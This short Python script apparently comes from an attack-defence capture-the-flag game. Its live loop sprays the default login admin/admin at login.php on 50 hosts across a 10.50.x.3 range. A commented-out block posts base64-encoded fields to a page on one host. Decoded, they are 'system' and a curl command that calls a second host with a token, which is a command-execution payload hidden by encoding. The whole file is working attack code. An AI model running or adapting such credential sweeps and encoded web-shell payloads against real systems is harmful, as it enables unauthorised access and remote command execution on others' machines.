import requests

if __name__ == "__main__":
    # url = "http://10.50.5.3/about.php"
    # data = {
    #     'pass': 'c3lzdGVt',
    #     'name': 'Y3VybCBodHRwOi8vMTAuMC4xLjI/dG9rZW49UVNaQkJYTUs='
    # }
    # ret = requests.session()
    # res = ret.post(url, data=data)
    # print(res.content)
    data = {
        "user":"admin",
        "pass":"admin"
    }
    ret = requests.session()
    for i in range(50):
        url = "http://10.50." + str(i) + ".3/login.php"
        res = ret.post(url,data=data)
        print(res.headers)
